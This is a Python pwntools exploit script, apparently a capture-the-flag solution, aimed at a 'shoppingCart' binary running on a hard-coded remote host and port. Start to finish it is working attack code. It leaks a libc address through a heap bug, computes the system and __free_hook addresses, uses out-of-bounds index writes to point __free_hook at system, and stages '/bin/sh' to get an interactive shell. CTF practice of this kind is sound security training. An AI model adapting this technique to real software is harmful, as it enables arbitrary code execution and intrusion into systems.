from pwn import *
context.log_level='debug'
debug=0
if debug:
	p = process('./task_shoppingCart')
else:
	p = remote("49.4.78.29", 30289)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
unsorted_offset = 0x7f0e626fec78-0x7f0e6233a000
def money(dollar):
	p.sendlineafter("EMMmmm, you will be a rich man!\n",'1')
	p.sendlineafter("I will give you $9999, but what's the  currency type you want, RMB or Dollar?\n",dollar)
def shop():
	p.sendlineafter("EMMmmm, you will be a rich man!\n",'3')
def add_goods(name,length):
	p.sendlineafter("Now, buy buy buy!\n",'1')
	p.sendlineafter("How long is your goods name?\n",str(length))
	p.sendafter("What is your goods name?",name)
def remove_goods(idx):
	p.sendlineafter("Now, buy buy buy!\n",'2')
	p.sendlineafter("Which goods that you don't need?\n",str(idx))
def modify_goods(new_name,idx):
	p.sendlineafter("Now, buy buy buy!\n",'3')
	p.sendlineafter("Which goods you need to modify?\n",idx)
	p.sendafter("to?\n",new_name)

for i in range(20):
	money("dollar")
	
shop()
add_goods("0"*8+'\x00',256)#0
add_goods('/bin/sh\x00',256)#1
remove_goods(0)
add_goods("",0)#2

p.sendlineafter("Now, buy buy buy!\n",'3')
p.sendlineafter("Which goods you need to modify?\n",'2')
p.recvuntil(" like to modify ")
libc_addr =u64( p.recv(6).ljust(8,'\x00'))-unsorted_offset
sys_addr = libc_addr + libc.symbols['system']
free_hook = libc_addr + libc.symbols['__free_hook']
log.info('libc_addr:%#x',libc_addr)
log.info('sys_addr:%#x',sys_addr)
log.info('free_hook:%#x',free_hook)
p.sendafter("to?\n","12345678")
#gdb.attach(p)
#4x0->400
idx = ((0x2021d8-0x2021e0)/8)&0xffffffffffffffff
modify_goods("abcdefgh",str(idx))

#write free_hook at money[0]
padding  = 0x9400-0x8420
#add_goods("a"*padding+p64(free_hook),padding+0x10)

#overwrite free_hook 
idx = ((0x202140-0x2021e0)/8)&0xffffffffffffffff
if debug:
	modify_goods(p64(sys_addr),(str(idx).ljust(24,'\x00')).ljust(padding,'1')+p64(free_hook))
else:
	modify_goods(p64(sys_addr),(str(idx)+'\n' + str('2')+'\n' + str('1')+'\n').ljust(0x100,'\n')+p64(free_hook)*0x5f)

#shell
#time.sleep(2)
#remove_goods(1)


p.interactive()
